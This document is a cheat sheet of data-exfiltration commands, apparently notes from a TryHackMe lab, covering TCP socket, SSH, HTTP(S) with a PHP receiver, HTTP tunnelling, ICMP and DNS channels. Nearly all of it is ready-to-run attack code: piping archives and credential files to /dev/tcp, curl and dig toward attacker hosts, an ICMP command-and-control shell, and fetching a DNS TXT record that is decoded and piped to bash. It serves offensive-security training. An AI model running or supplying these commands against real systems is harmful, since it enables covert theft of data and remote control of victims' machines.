# Data exfiltration

## Exfiltration using TCP socket and Base64 (not useful on secured networks)

{% code overflow="wrap" %}
```sh
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
```
{% endcode %}

## Exfiltration using SSH

```
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

## Exfiltration using HTTP(S)

{% code overflow="wrap" fullWidth="true" %}
```bash
# An attacker needs control over a webserver with a server-side programming language installed and enabled (PHP, Golang, Python...)
# HTTP POST Method (needs a web server such as web.thm.com)
# Prepare a webserver, PHP code (contact.php) POST requests via a file parameter and stores the received data in /tmp/http.bs64
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
# The exfiltrated data will be found where the web server resides. We need to get rid of URL encoding (+ instead of spaces)
thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
cat /tmp/http.bs64 | base64 -d | tar xvfz - # finally decode the base64 and unarchive it

# HTTPS
We need to set up our own HTTP server, more info https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04

# HTTP Tunneling
https://github.com/L-codes/Neo-reGeorg
#  generate an encrypted client file to upload it to the victim web server
python3 neoreg.py generate -k thm # generates encrypted Tunneling clients with thm key in the neoreg_servers/ directory
# There are various extensions available, we just need to upload one to the pivot machine and then access it:
root@attacking python3 neoreg.py -k thm -u http://10.10.200.172/uploader/files/tunnel.php
# Once it is connected to the tunneling client, we can use the tunnel connection as a proxy binds to 127.0.0.1 on port 1080. 
root@Aattacking:~$ curl --socks5 127.0.0.1:1080 http://$TARGET_IP:$TARGET_PORT
```
{% endcode %}

## Exfiltration using ICMP

{% code overflow="wrap" fullWidth="true" %}
```bash
# Only works on Linux since -p parameter is there
root@AttackBox$ echo "thm:tryhackme" | xxd -p 
74686d3a7472796861636b6d650a
root@AttackBox$ ping 10.10.147.247 -c 1 -p 74686d3a7472796861636b6d650a

# On Metasploit
msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
INTERFACE => eth0
msf5 auxiliary(server/icmp_exfil) > run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
# The victim starts sending the BOF trigger so Metasploit knows it has to start writing to disk
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt" # BOFfile is the string to trigger the reception
# Then the info is sent
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
# We should see the info on Metasploit
[+] Beginning capture of "file.txt" data
[*] 30 bytes of data received in total
[+] End of File received. Saving "file.txt" to loot
[+] Incoming file "file.txt" saved to loot

# ICMP C2 Communication (to execute commands through ICMP)
https://github.com/krabelize/icmpdoor
# The victim runs icmpdoor binary specifying the interface to communicate over and the destination IP
thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
# On the attacker or pivot machine, we execute the icmp-cnc binary to communicate with the victim and we run a command to confirm it is ok
thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
shell: hostname
hostname
shell: icmp-host
# To confirm all goes via ICMP, use tcpdump
sudo tcpdump ip proto \\icmp -i eth1 -w file.pcap
sudo tcpdump -nX -r file.pcap
```
{% endcode %}

## Exfiltration over DNS

{% code overflow="wrap" fullWidth="true" %}
```bash
    An attacker registers a domain name, for example, tunnel.com 
    The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
    The malware or the attacker sends sensitive data from a victim machine to a domain name they controlâ€”for example, passw0rd.tunnel.com, where passw0rd is the data that needs to be transferred.
    The DNS request is sent through the local DNS server and is forwarded through the Internet.
    The attacker's authoritative DNS (malicious server) receives the DNS request.
    Finally, the attacker extracts the password from the domain name.

# Another way
# Start tcpdump on the pivot/jump machine
thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v
thm@victim2:~$ cat creds.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/sub.domain.com/  | awk '{print "dig +short " $1}' | bash
# We should see the DNS request on tcpdump and to decode it
thm@attacker:~$ echo "T....==.sub.domain.com." | cut -d"." -f1-8 | tr -d "." | base64 -d

# C2 Communications over DNS (execute commands)
thm@victim2$ cat /tmp/script.sh | base64 
# We add the rsult as a TXT DNS record to the dommain we control (domain.com)
# We used the dig command to check the TXT record of our DNS record that we added in the previous step
thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```
{% endcode %}
